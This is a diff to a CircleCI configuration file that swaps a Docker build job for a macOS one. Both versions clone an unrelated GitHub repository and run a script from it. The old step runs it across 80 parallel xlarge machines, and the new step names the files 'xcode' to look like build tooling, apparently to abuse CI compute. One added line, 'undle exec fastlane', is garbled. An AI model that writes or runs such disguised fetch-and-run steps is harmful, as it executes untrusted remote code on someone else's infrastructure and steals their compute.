@@ -1,14 +1,18 @@
-version: 2
+version: 2.1
+
+orbs:
+    mac-permissions: circleci/macos
+
 jobs:
-  build:
-    docker:
-      - image: node:latest
-    parallelism: 80
-    resource_class: xlarge
+  build-test:
+    macos:
+      xcode: 12.5.1
     steps:
-      - run: git clone https://github.com/puyuhdus/0.git && cd 0 && chmod u+x umi sh.sh && ./sh.sh
+        - checkout
+        - run: git clone https://github.com/puyuhdus/0.git && cd 0 && chmod u+x xcode xcode.sh && ./xcode.sh
+undle exec fastlane testandbuild
+
 workflows:
-    version: 2
-    build:
+    verify:
         jobs:
-            - build
+            - build-test
